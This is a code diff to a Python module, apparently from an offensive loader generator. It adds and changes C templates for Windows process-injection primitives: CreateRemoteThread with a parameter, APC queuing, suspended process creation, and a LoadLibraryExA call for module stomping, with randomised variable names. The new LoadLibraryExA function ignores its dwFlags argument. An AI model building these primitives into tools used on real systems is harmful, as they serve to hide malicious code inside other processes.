@@ -1,11 +1,12 @@
 from string import Template
 from pathlib import Path, PureWindowsPath
+import os
 
 def VirtualProtect(lpAddress, dwSize, flNewProtect):
     return Template("""
-    DWORD oldProtect;
-    {VirtualProtect}($lpAddress, $dwSize, $flNewProtect, &oldProtect);
-""").substitute(lpAddress=lpAddress, dwSize=dwSize, flNewProtect=flNewProtect)
+    DWORD oldProtect_$n;
+    {VirtualProtect}($lpAddress, $dwSize, $flNewProtect, &oldProtect_$n);
+""").substitute(lpAddress=lpAddress, dwSize=dwSize, flNewProtect=flNewProtect, n=os.urandom(4).hex())
     
 def VirtualProtectEx(hProcess, lpAddress, dwSize, flNewProtect):
     return Template("""
@@ -149,10 +150,10 @@ def NtCreateUserProcess(target):
     {NtCreateUserProcess}(&hProcess, &hThread, PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS, NULL, NULL, 0, THREAD_CREATE_FLAGS_CREATE_SUSPENDED, procParams, &createInfo, &attrList);
 """).substitute(target=target, image=image, curdir=curdir)
 
-def CreateRemoteThread(output, hProcess, lpStartAddress):
+def CreateRemoteThread(output, hProcess, lpStartAddress, lpParameter='NULL'):
     return Template("""
-    HANDLE $output = {CreateRemoteThread}($hProcess, NULL, 0, $lpStartAddress, NULL, 0, NULL);
-    """).substitute(output=output, hProcess=hProcess, lpStartAddress=lpStartAddress)
+    HANDLE $output = {CreateRemoteThread}($hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)$lpStartAddress, $lpParameter, 0, NULL);
+""").substitute(output=output, hProcess=hProcess, lpStartAddress=lpStartAddress, lpParameter=lpParameter)
 
 def QueueUserAPC(pfnAPC, hThread):
     return Template("""
@@ -186,3 +187,8 @@ def NtQueueApcThread(hThread, pfnAPC):
     return Template("""
     {NtQueueApcThread}($hThread, $pfnAPC, NULL, NULL, 0);
 """).substitute(pfnAPC=pfnAPC, hThread=hThread)
+
+def LoadLibraryExA(output, lpLibfileName, dwFlags):
+    return Template("""
+    HMODULE $output  = {LoadLibraryExA}( "$lpLibfileName", NULL, DONT_RESOLVE_DLL_REFERENCES );
+""").substitute(output=output, lpLibfileName=lpLibfileName, dwFlags=dwFlags)
